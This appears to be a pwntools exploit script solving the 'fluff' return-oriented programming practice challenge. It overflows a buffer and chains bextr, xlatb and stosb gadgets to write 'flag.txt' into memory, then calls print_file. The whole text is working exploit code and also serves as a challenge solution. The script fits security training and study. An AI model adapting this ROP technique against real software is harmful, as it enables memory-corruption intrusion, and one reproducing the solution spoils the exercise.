from pwn import *

elf = ELF("./attachment/fluff")
rop = ROP(elf)

io = process(elf.path, cwd="./attachment", level="DEBUG")
bss_address = 0x00601038
pop_rdi_ret = 0x00000000004006a3

FLAG_FILE_NAME = b"flag.txt"

io.recv()
payload = b"A" * 40

rax = 0xb
for i in range(8):
    if i > 0:
        rax = FLAG_FILE_NAME[i - 1]
    flag_char_address = next(elf.search(FLAG_FILE_NAME[i]))
    payload += p64(0x0040062a)  # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret
    payload += p64(0x4000)
    payload += p64(flag_char_address - rax - 0x3ef2)
    payload += p64(0x00400628)  # xlatb
    if i == 0:
        payload += p64(pop_rdi_ret)  # pop rdi; ret
        payload += p64(bss_address)
    payload += p64(0x0000000000400639)  # stosb byte ptr [rdi], al ; ret

payload += p64(pop_rdi_ret)  # pop rdi; ret
payload += p64(bss_address)
payload += p64(0x0000000000400295)  # ret
payload += p64(0x0000000000400510)  # print_file@plt
assert len(payload) <= 0x200
io.sendline(payload)
io.recvall()